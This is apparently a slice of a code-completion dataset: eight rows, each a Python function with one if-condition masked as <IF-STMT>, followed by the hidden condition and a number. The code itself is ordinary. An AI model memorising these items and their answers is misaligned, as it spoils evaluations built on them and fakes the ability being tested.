4992,"def run_async(self, source, target, reverse):<tab>to_load = target or self.get_next(source, reverse)<tab>if not to_load:<tab><tab>return<tab>view_signature = self.view_signatures[to_load]<tab>window = self.view.window()<tab>if window:<tab><tab>window.run_command(self.commands[to_load])<tab><tab><IF-STMT><tab><tab><tab>sublime.set_timeout_async(self.view.close)",if not self . view . settings ( ) . get ( view_signature ) :,129
4993,"def eval_operand(assembly, start, stop, prefix=""""):<tab>imm = assembly[start + 1 : stop]<tab>try:<tab><tab>eval_imm = eval(imm)<tab><tab><IF-STMT><tab><tab><tab>eval_imm = 0xFFFFFFFF - eval_imm<tab><tab><tab>eval_imm += 1<tab><tab><tab>eval_imm = -eval_imm<tab><tab>return assembly.replace(prefix + imm, prefix + hex(eval_imm))<tab>except:<tab><tab>return assembly",if eval_imm > 0x80000000 :,122
4994,"def admin():<tab>if Configuration.loginRequired():<tab><tab><IF-STMT><tab><tab><tab>return render_template(""login.html"")<tab>else:<tab><tab>person = User.get(""_dummy_"")<tab><tab>login_user(person)<tab>output = None<tab>if os.path.isfile(Configuration.getUpdateLogFile()):<tab><tab>with open(Configuration.getUpdateLogFile()) as updateFile:<tab><tab><tab>separator = ""==========================\n""<tab><tab><tab>output = updateFile.read().split(separator)[-2:]<tab><tab><tab>output = separator + separator.join(output)<tab>return render_template(""admin.html"", status=""default"", **adminInfo(output))",if not current_user . is_authenticated ( ) :,164
4995,"def data(self):<tab>result = """"<tab>for hunk in self._hunks:<tab><tab><IF-STMT><tab><tab><tab>hunk, f = hunk<tab><tab>else:<tab><tab><tab>f = lambda x: x<tab><tab>result += f(hunk.data())<tab>return result","if isinstance ( hunk , tuple ) and len ( hunk ) == 2 :",85
4996,"def not_less_witness(self, other):<tab>n = max(self.longest_run_of_spaces(), other.longest_run_of_spaces()) + 1<tab>a = []<tab>for ts in range(1, n + 1):<tab><tab><IF-STMT><tab><tab><tab>a.append((ts, self.indent_level(ts), other.indent_level(ts)))<tab>return a",if self . indent_level ( ts ) >= other . indent_level ( ts ) :,110
4997,"def _validate(self) -> None:<tab>indent = self.indent<tab>if indent is not None:<tab><tab><IF-STMT><tab><tab><tab>raise CSTValidationError(<tab><tab><tab><tab>""An indented block must have a non-zero width indent.""<tab><tab><tab>)<tab><tab>if _INDENT_WHITESPACE_RE.fullmatch(indent) is None:<tab><tab><tab>raise CSTValidationError(<tab><tab><tab><tab>""An indent must be composed of only whitespace characters.""<tab><tab><tab>)",if len ( indent ) == 0 :,116
4998,"def sanitize_numeric_fields(info):<tab>for numeric_field in self._NUMERIC_FIELDS:<tab><tab>field = info.get(numeric_field)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>report_force_conversion(numeric_field, ""numeric"", ""int"")<tab><tab>info[numeric_field] = int_or_none(field)","if field is None or isinstance ( field , compat_numeric_types ) :",96
4999,"def count(self):<tab>if self._should_cache(""count""):<tab><tab># Optmization borrowed from overriden method:<tab><tab># if queryset cache is already filled just return its len<tab><tab><IF-STMT><tab><tab><tab>return len(self._result_cache)<tab><tab>return cached_as(self)(lambda: self._no_monkey.count(self))()<tab>else:<tab><tab>return self._no_monkey.count(self)",if self . _result_cache is not None :,112
